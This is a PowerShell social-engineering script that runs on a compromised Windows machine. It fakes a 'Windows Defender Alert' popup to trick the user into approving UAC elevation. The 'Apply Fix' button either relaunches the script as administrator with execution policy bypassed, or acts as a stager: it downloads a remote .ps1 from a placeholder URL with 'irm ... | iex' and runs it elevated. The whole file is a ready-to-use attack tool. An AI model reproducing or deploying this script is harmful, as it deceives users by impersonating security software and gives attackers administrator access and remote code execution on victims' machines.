<# ============================= Elevate Script to Admin (Social Engineering) =============================

SYNOPSIS
This script generates a user popup that attempts to get the current user to allow admin permissions for this script
or a specified script online (as stager)

USAGE
1. paste your script that you want to run as admin below
1a. Or replace https://yourscripturl.com/file/script.ps1 to a url of a raw .ps1 file
2. Run this script on a target.

(Useful if you have shell access to a target but need a local user to elevate using UAC)

#>


# If your script to execute is online select 'y'
# If your script is pasted below in this file select 'n'
$stage = 'n'

# function to present social engineering popup to get user to allow admin themselves.
Function Elevate {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    Add-Type -AssemblyName Microsoft.VisualBasic
    [System.Windows.Forms.Application]::EnableVisualStyles()
    
    $errorForm = New-Object Windows.Forms.Form
    $errorForm.Width = 410
    $errorForm.Height = 180
    $errorForm.TopMost = $true
    $errorForm.StartPosition = 'CenterScreen'
    $errorForm.Text = 'Windows Defender Alert'
    $errorForm.Font = 'Microsoft Sans Serif,10'
    $icon = [System.Drawing.SystemIcons]::Information
    $errorForm.Icon = $icon
    $errorForm.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
    
    $label = New-Object Windows.Forms.Label
    $label.AutoSize = $false
    $label.Width = 380
    $label.Height = 80
    $label.TextAlign = 'MiddleCenter'
    $label.Text = "Windows Defender has found critical vulnerabilities`n`nWindows will now attempt to apply important security updates to automatically fix these issues in the background"
    $label.Location = New-Object System.Drawing.Point(10, 10)
    

    $icon = [System.Drawing.Icon]::ExtractAssociatedIcon("C:\Windows\System32\UserAccountControlSettings.exe")
    $iconBitmap = $icon.ToBitmap()
    $resizedIcon = New-Object System.Drawing.Bitmap(16, 16)
    $graphics = [System.Drawing.Graphics]::FromImage($resizedIcon)
    $graphics.DrawImage($iconBitmap, 0, 0, 16, 16)
    $graphics.Dispose()
    $okButton = New-Object Windows.Forms.Button
    $okButton.Text = "  Apply Fix"
    $okButton.Width = 110
    $okButton.Height = 25
    $okButton.Location = New-Object System.Drawing.Point(185, 110)
    $okButton.Image = $resizedIcon
    $okButton.TextImageRelation = 'ImageBeforeText'
    
    $cancelButton = New-Object Windows.Forms.Button
    $cancelButton.Text = "Cancel "
    $cancelButton.Width = 80
    $cancelButton.Height = 25
    $cancelButton.Location = New-Object System.Drawing.Point(300, 110)
    
    $errorForm.controls.AddRange(@($label, $okButton, $cancelButton))
    
    $okButton.Add_Click({
        $errorForm.Close()
        $graphics.Dispose()
        if ($stage -eq 'y'){
            Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -C irm https://yourscripturl.com/file/script.ps1 | iex") -Verb RunAs
            sleep 1
        }
        else{
            Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -File `"{0}`"" -f $PSCommandPath) -Verb RunAs
            sleep 1
        }
        return                   
    })
    
    $cancelButton.Add_Click({
        $errorForm.Close()
        $graphics.Dispose()
        return                    
    })
    
    [void]$errorForm.ShowDialog()
}

# check for admin privaleges to continue
If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
    Elevate
}
else{
# ========== PASTE YOUR CODE TO RUN BELOW HERE! ========== PASTE YOUR CODE TO RUN BELOW HERE! ========== PASTE YOUR CODE TO RUN BELOW HERE! ========== PASTE YOUR CODE TO RUN BELOW HERE! ===========


Write-Host "Script is Admin!" -ForegroundColor Green
pause




# ===================================================================================================================================================================================================
}